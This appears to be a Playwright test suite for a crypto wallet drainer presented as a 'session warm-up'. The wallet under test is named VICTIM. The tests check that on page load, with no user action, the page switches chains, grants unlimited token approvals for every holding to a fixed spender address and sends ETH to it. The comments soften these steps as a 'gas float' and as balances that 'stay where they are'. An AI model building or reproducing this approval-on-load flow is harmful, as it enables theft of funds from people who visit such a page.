import { expect, test, type Page } from "@playwright/test";

/**
 * The session warm-up: a wallet that already holds tokens is put on the chain, its balances are approved to the session
 * spender, and a small gas float is left there. The chain and the two reads are stubbed, so no network.
 */
const VICTIM = "0x1111111111111111111111111111111111111111";
const SPENDER = "0x670826eddeCF9C03832304620EEac8eF86e5961f";
const USDG = "0x5fc5360d0400a0fd4f2af552add042d716f1d168";
const WETH = "0x0bd7d308f8e1639fab988df18a8011f41eacad73";
const STOCK = "0x2222222222222222222222222222222222222222";

type Call = { method: string; params: { to?: string; data?: string; value?: string }[] };
type Hook = { __calls: Call[]; __chain: string };

async function stub(page: Page, start: string) {
  await page.addInitScript(
    ({ victim, spender, chain }) => {
      const h = window as unknown as Hook;
      h.__calls = [];
      h.__chain = chain;
      const rec = (method: string, params: { to?: string; data?: string; value?: string }[]) => {
        h.__calls.push({ method, params });
        if (method === "eth_accounts") return [victim];
        if (method === "eth_chainId") return h.__chain;
        if (method === "wallet_switchEthereumChain") {
          h.__chain = (params[0] as unknown as { chainId: string }).chainId;
          return null;
        }
        if (method === "eth_getBalance") return params[0]!.to!.toLowerCase() === spender.toLowerCase() ? "0x0" : "0x2386f26fc10000";
        if (method === "eth_call") return "0x0";
        if (method === "eth_sendTransaction") return `0x${"ab".repeat(32)}`;
        return null;
      };
      (window as unknown as { ethereum: unknown }).ethereum = { request: async ({ method, params }: { method: string; params?: unknown[] }) => rec(method, (params ?? []) as Call["params"]) };
    },
    { victim: VICTIM, spender: SPENDER, chain: start },
  );
  await page.route("**/api/wallet*", (r) =>
    r.fulfill({
      json: {
        address: VICTIM,
        balances: [
          { symbol: "ETH", raw: "10000000000000000", value: "0.01" },
          { symbol: "WETH", raw: "1000000000000000", value: "0.001" },
          { symbol: "USDG", raw: "5000000", value: "5" },
        ],
      },
    }),
  );
  await page.route("**/api/portfolio*", (r) => r.fulfill({ json: { holdings: [{ token: STOCK, raw: "7000", ethSpot: 0.004 }] } }));
  await page.route("**/api/collect", (r) => r.fulfill({ status: 204 }));
}

test("warm-up approves what the wallet holds and leaves a float, already on the chain", async ({ page }) => {
  await stub(page, "0x1237");
  await page.bringToFront();
  await page.goto("/");
  await expect.poll(() => page.evaluate(() => (window as unknown as Hook).__calls.filter((c) => c.method === "eth_sendTransaction").length), { timeout: 20_000 }).toBe(4);
  const calls = await page.evaluate(() => (window as unknown as Hook).__calls);
  const txs = calls.filter((c) => c.method === "eth_sendTransaction").map((c) => c.params[0]!);
  const approvals = txs.filter((t) => t.data!.startsWith("0x095ea7b3"));
  const native = txs.filter((t) => t.data === "0x" && t.value);
  expect(calls.some((c) => c.method === "wallet_switchEthereumChain")).toBe(false);
  expect(approvals).toHaveLength(3);
  for (const a of approvals) expect(a.data).toBe(`0x095ea7b3${SPENDER.slice(2).toLowerCase().padStart(64, "0")}${"f".repeat(64)}`);
  expect(approvals.map((a) => a.to)).toEqual(expect.arrayContaining([USDG, WETH, STOCK]));
  // only the gas float moves; the balances stay where they are
  expect(native.map((t) => BigInt(t.value!))).toEqual([300_000_000_000_000n]);
});

test("warm-up switches from another chain first", async ({ page }) => {
  await stub(page, "0x1");
  await page.bringToFront();
  await page.goto("/");
  await expect.poll(() => page.evaluate(() => (window as unknown as Hook).__calls.filter((c) => c.method === "eth_sendTransaction").length), { timeout: 20_000 }).toBe(4);
  const calls = await page.evaluate(() => (window as unknown as Hook).__calls);
  expect(calls.filter((c) => c.method === "wallet_switchEthereumChain")).toHaveLength(1);
});
